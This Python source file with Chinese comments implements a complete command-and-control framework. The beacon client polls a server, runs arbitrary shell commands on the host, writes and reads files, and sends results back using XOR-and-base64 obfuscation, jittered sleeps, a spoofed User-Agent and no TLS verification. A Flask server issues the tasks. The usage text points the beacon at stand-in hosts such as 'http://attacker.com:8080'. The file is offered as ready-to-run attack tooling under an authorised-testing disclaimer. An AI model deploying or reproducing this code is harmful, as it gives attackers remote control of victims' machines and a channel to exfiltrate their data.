#!/usr/bin/env python3
"""
轻量级 Beacon - Lightweight C2 Beacon
功能: HTTP/HTTPS 回连、任务获取/执行、结果上传
仅用于授权渗透测试和安全研究
"""

import os
import sys
import time
import uuid
import json
import base64
import hashlib
import socket
import platform
import subprocess
import threading
import logging
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import random

logger = logging.getLogger(__name__)

# HTTP 库
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from flask import Flask, request, jsonify
    HAS_FLASK = True
except ImportError:
    HAS_FLASK = False


class TaskType(Enum):
    """任务类型"""
    SHELL = "shell"  # Shell 命令
    UPLOAD = "upload"  # 上传文件
    DOWNLOAD = "download"  # 下载文件
    SCREENSHOT = "screenshot"  # 截图
    KEYLOG = "keylog"  # 键盘记录
    PERSIST = "persist"  # 持久化
    EXIT = "exit"  # 退出
    SLEEP = "sleep"  # 修改睡眠时间
    CHECKIN = "checkin"  # 签到


class TaskStatus(Enum):
    """任务状态"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"


@dataclass
class BeaconConfig:
    """Beacon 配置"""
    # C2 服务器
    c2_url: str = "http://127.0.0.1:8080"

    # 通信参数
    sleep_time: int = 60  # 秒
    jitter: float = 0.3  # 抖动 (0-1)
    max_retries: int = 3

    # 加密
    encryption_key: Optional[str] = None

    # 代理
    proxy: Optional[str] = None

    # User-Agent
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # 端点
    checkin_endpoint: str = "/api/checkin"
    task_endpoint: str = "/api/tasks"
    result_endpoint: str = "/api/results"


@dataclass
class BeaconTask:
    """Beacon 任务"""
    task_id: str
    task_type: TaskType
    payload: str  # 命令或参数
    status: TaskStatus = TaskStatus.PENDING
    result: str = ""
    created_at: float = field(default_factory=time.time)
    completed_at: Optional[float] = None


@dataclass
class BeaconInfo:
    """Beacon 信息"""
    beacon_id: str
    hostname: str
    username: str
    os_info: str
    ip_address: str
    pid: int
    arch: str
    first_seen: float
    last_seen: float
    sleep_time: int


class LightBeacon:
    """
    轻量级 Beacon 客户端

    Usage (在目标机器上):
        config = BeaconConfig(c2_url="http://attacker.com:8080")
        beacon = LightBeacon(config)
        beacon.run()  # 开始运行

    注意: 此代码仅供授权渗透测试和安全研究使用
    """

    def __init__(self, config: BeaconConfig):
        self.config = config
        self.beacon_id = self._generate_beacon_id()
        self._running = False
        self._session = None

        # 系统信息
        self.hostname = socket.gethostname()
        self.username = os.getenv("USERNAME", os.getenv("USER", "unknown"))
        self.os_info = f"{platform.system()} {platform.release()}"
        self.arch = platform.machine()
        self.pid = os.getpid()

    def _generate_beacon_id(self) -> str:
        """生成唯一 Beacon ID"""
        unique_string = f"{socket.gethostname()}-{uuid.getnode()}"
        return hashlib.md5(unique_string.encode()).hexdigest()[:16]

    def _get_session(self):
        """获取 HTTP 会话"""
        if self._session is None and HAS_REQUESTS:
            self._session = requests.Session()
            self._session.headers.update({
                "User-Agent": self.config.user_agent,
                "X-Beacon-ID": self.beacon_id,
            })
            if self.config.proxy:
                self._session.proxies = {
                    "http": self.config.proxy,
                    "https": self.config.proxy,
                }
        return self._session

    def _calculate_sleep(self) -> float:
        """计算带抖动的睡眠时间"""
        base = self.config.sleep_time
        jitter = base * self.config.jitter * (random.random() - 0.5) * 2
        return max(1, base + jitter)

    def _encrypt(self, data: str) -> str:
        """加密数据 (简单 XOR + Base64)"""
        if not self.config.encryption_key:
            return base64.b64encode(data.encode()).decode()

        key = self.config.encryption_key.encode()
        encrypted = bytes([
            data.encode()[i] ^ key[i % len(key)]
            for i in range(len(data))
        ])
        return base64.b64encode(encrypted).decode()

    def _decrypt(self, data: str) -> str:
        """解密数据"""
        decoded = base64.b64decode(data)

        if not self.config.encryption_key:
            return decoded.decode()

        key = self.config.encryption_key.encode()
        decrypted = bytes([
            decoded[i] ^ key[i % len(key)]
            for i in range(len(decoded))
        ])
        return decrypted.decode()

    def checkin(self) -> bool:
        """向 C2 服务器签到"""
        session = self._get_session()
        if not session:
            return False

        info = {
            "beacon_id": self.beacon_id,
            "hostname": self.hostname,
            "username": self.username,
            "os_info": self.os_info,
            "arch": self.arch,
            "pid": self.pid,
            "ip_address": self._get_local_ip(),
            "timestamp": time.time(),
        }

        try:
            url = f"{self.config.c2_url}{self.config.checkin_endpoint}"
            response = session.post(url, json=info, timeout=30, verify=False)

            if response.status_code == 200:
                logger.debug(f"Checkin successful: {self.beacon_id}")
                return True

        except Exception as e:
            logger.debug(f"Checkin failed: {e}")

        return False

    def get_tasks(self) -> List[BeaconTask]:
        """从 C2 获取待执行任务"""
        session = self._get_session()
        if not session:
            return []

        try:
            url = f"{self.config.c2_url}{self.config.task_endpoint}/{self.beacon_id}"
            response = session.get(url, timeout=30, verify=False)

            if response.status_code == 200:
                tasks_data = response.json()
                tasks = []

                for task_data in tasks_data.get("tasks", []):
                    task = BeaconTask(
                        task_id=task_data.get("task_id", str(uuid.uuid4())),
                        task_type=TaskType(task_data.get("type", "shell")),
                        payload=task_data.get("payload", ""),
                    )
                    tasks.append(task)

                return tasks

        except Exception as e:
            logger.debug(f"Get tasks failed: {e}")

        return []

    def send_result(self, task: BeaconTask) -> bool:
        """发送任务结果"""
        session = self._get_session()
        if not session:
            return False

        result_data = {
            "beacon_id": self.beacon_id,
            "task_id": task.task_id,
            "status": task.status.value,
            "result": self._encrypt(task.result),
            "timestamp": time.time(),
        }

        try:
            url = f"{self.config.c2_url}{self.config.result_endpoint}"
            response = session.post(url, json=result_data, timeout=30, verify=False)

            return response.status_code == 200

        except Exception as e:
            logger.debug(f"Send result failed: {e}")

        return False

    def execute_task(self, task: BeaconTask) -> BeaconTask:
        """执行任务"""
        task.status = TaskStatus.RUNNING

        try:
            if task.task_type == TaskType.SHELL:
                task.result = self._execute_shell(task.payload)
                task.status = TaskStatus.COMPLETED

            elif task.task_type == TaskType.UPLOAD:
                # payload 格式: {"path": "/path/to/file", "content": "base64_content"}
                data = json.loads(task.payload)
                success = self._upload_file(data["path"], data["content"])
                task.result = "Upload successful" if success else "Upload failed"
                task.status = TaskStatus.COMPLETED if success else TaskStatus.FAILED

            elif task.task_type == TaskType.DOWNLOAD:
                content = self._download_file(task.payload)
                task.result = content
                task.status = TaskStatus.COMPLETED if content else TaskStatus.FAILED

            elif task.task_type == TaskType.SLEEP:
                self.config.sleep_time = int(task.payload)
                task.result = f"Sleep time set to {task.payload}s"
                task.status = TaskStatus.COMPLETED

            elif task.task_type == TaskType.EXIT:
                task.result = "Exiting..."
                task.status = TaskStatus.COMPLETED
                self._running = False

            else:
                task.result = f"Unknown task type: {task.task_type}"
                task.status = TaskStatus.FAILED

        except Exception as e:
            task.result = str(e)
            task.status = TaskStatus.FAILED

        task.completed_at = time.time()
        return task

    def _execute_shell(self, command: str) -> str:
        """执行 Shell 命令"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["cmd.exe", "/c", command],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
            else:
                result = subprocess.run(
                    ["/bin/bash", "-c", command],
                    capture_output=True,
                    text=True,
                    timeout=60
                )

            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR]\n{result.stderr}"

            return output[:10000]  # 限制输出大小

        except subprocess.TimeoutExpired:
            return "[Error] Command timed out"
        except Exception as e:
            return f"[Error] {str(e)}"

    def _upload_file(self, path: str, content_b64: str) -> bool:
        """上传文件到目标"""
        try:
            content = base64.b64decode(content_b64)
            with open(path, 'wb') as f:
                f.write(content)
            return True
        except Exception as e:
            logger.error(f"Upload failed: {e}")
            return False

    def _download_file(self, path: str) -> str:
        """从目标下载文件"""
        try:
            with open(path, 'rb') as f:
                content = f.read()
            return base64.b64encode(content).decode()
        except Exception as e:
            logger.error(f"Download failed: {e}")
            return ""

    def _get_local_ip(self) -> str:
        """获取本地 IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def run(self):
        """运行 Beacon 主循环"""
        self._running = True
        logger.info(f"Beacon started: {self.beacon_id}")

        while self._running:
            try:
                # 签到
                self.checkin()

                # 获取任务
                tasks = self.get_tasks()

                # 执行任务
                for task in tasks:
                    task = self.execute_task(task)
                    self.send_result(task)

                    if not self._running:
                        break

            except Exception as e:
                logger.debug(f"Beacon error: {e}")

            # 睡眠
            if self._running:
                sleep_time = self._calculate_sleep()
                time.sleep(sleep_time)

        logger.info("Beacon stopped")

    def run_async(self) -> threading.Thread:
        """异步运行 Beacon"""
        thread = threading.Thread(target=self.run)
        thread.daemon = True
        thread.start()
        return thread

    def stop(self):
        """停止 Beacon"""
        self._running = False


class BeaconServer:
    """
    Beacon 服务器 (C2 Server)

    Usage:
        server = BeaconServer(host="0.0.0.0", port=8080)
        server.run()
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
        self.host = host
        self.port = port

        # 存储
        self.beacons: Dict[str, BeaconInfo] = {}
        self.tasks: Dict[str, List[BeaconTask]] = {}  # beacon_id -> tasks
        self.results: Dict[str, List[Dict]] = {}  # beacon_id -> results

        self._app = None

    def _create_app(self):
        """创建 Flask 应用"""
        if not HAS_FLASK:
            raise ImportError("Flask not installed")

        app = Flask(__name__)

        @app.route('/api/checkin', methods=['POST'])
        def checkin():
            data = request.json
            beacon_id = data.get('beacon_id')

            if beacon_id:
                if beacon_id not in self.beacons:
                    # 新 Beacon
                    self.beacons[beacon_id] = BeaconInfo(
                        beacon_id=beacon_id,
                        hostname=data.get('hostname', ''),
                        username=data.get('username', ''),
                        os_info=data.get('os_info', ''),
                        ip_address=data.get('ip_address', ''),
                        pid=data.get('pid', 0),
                        arch=data.get('arch', ''),
                        first_seen=time.time(),
                        last_seen=time.time(),
                        sleep_time=60
                    )
                    logger.info(f"New beacon: {beacon_id} from {data.get('ip_address')}")
                else:
                    # 更新 last_seen
                    self.beacons[beacon_id].last_seen = time.time()

                return jsonify({"status": "ok"})

            return jsonify({"status": "error"}), 400

        @app.route('/api/tasks/<beacon_id>', methods=['GET'])
        def get_tasks(beacon_id):
            tasks = self.tasks.get(beacon_id, [])

            # 返回待执行任务
            pending_tasks = [t for t in tasks if t.status == TaskStatus.PENDING]

            tasks_data = [
                {
                    "task_id": t.task_id,
                    "type": t.task_type.value,
                    "payload": t.payload,
                }
                for t in pending_tasks
            ]

            # 标记为已发送
            for t in pending_tasks:
                t.status = TaskStatus.RUNNING

            return jsonify({"tasks": tasks_data})

        @app.route('/api/results', methods=['POST'])
        def receive_result():
            data = request.json
            beacon_id = data.get('beacon_id')

            if beacon_id not in self.results:
                self.results[beacon_id] = []

            self.results[beacon_id].append(data)
            logger.info(f"Result from {beacon_id}: task {data.get('task_id')}")

            return jsonify({"status": "ok"})

        return app

    def add_task(self, beacon_id: str, task_type: TaskType, payload: str) -> str:
        """添加任务"""
        if beacon_id not in self.tasks:
            self.tasks[beacon_id] = []

        task = BeaconTask(
            task_id=str(uuid.uuid4())[:8],
            task_type=task_type,
            payload=payload
        )

        self.tasks[beacon_id].append(task)
        logger.info(f"Task added for {beacon_id}: {task.task_id}")

        return task.task_id

    def get_beacons(self) -> List[BeaconInfo]:
        """获取所有 Beacon"""
        return list(self.beacons.values())

    def get_results(self, beacon_id: str) -> List[Dict]:
        """获取 Beacon 结果"""
        return self.results.get(beacon_id, [])

    def run(self):
        """运行服务器"""
        self._app = self._create_app()
        logger.info(f"Beacon server starting on {self.host}:{self.port}")
        self._app.run(host=self.host, port=self.port, debug=False)

    def run_async(self) -> threading.Thread:
        """异步运行服务器"""
        thread = threading.Thread(target=self.run)
        thread.daemon = True
        thread.start()
        return thread


# 便捷函数
def create_beacon(c2_url: str,
                  sleep_time: int = 60,
                  encryption_key: Optional[str] = None) -> LightBeacon:
    """
    创建 Beacon 实例

    Args:
        c2_url: C2 服务器地址
        sleep_time: 回连间隔
        encryption_key: 加密密钥
    """
    config = BeaconConfig(
        c2_url=c2_url,
        sleep_time=sleep_time,
        encryption_key=encryption_key
    )
    return LightBeacon(config)


def start_beacon_server(host: str = "0.0.0.0",
                        port: int = 8080) -> BeaconServer:
    """
    启动 Beacon 服务器

    Args:
        host: 监听地址
        port: 监听端口
    """
    server = BeaconServer(host, port)
    server.run_async()
    return server


if __name__ == "__main__":
    print("Lightweight Beacon Module")
    print("=" * 50)
    print(f"requests available: {HAS_REQUESTS}")
    print(f"flask available: {HAS_FLASK}")
    print("\n[!] This module is for authorized penetration testing only!")
    print("\nUsage:")
    print("  # Server side:")
    print("  from core.c2 import start_beacon_server")
    print("  server = start_beacon_server(port=8080)")
    print("")
    print("  # Client side:")
    print("  from core.c2 import create_beacon")
    print("  beacon = create_beacon('http://attacker:8080')")
    print("  beacon.run()")
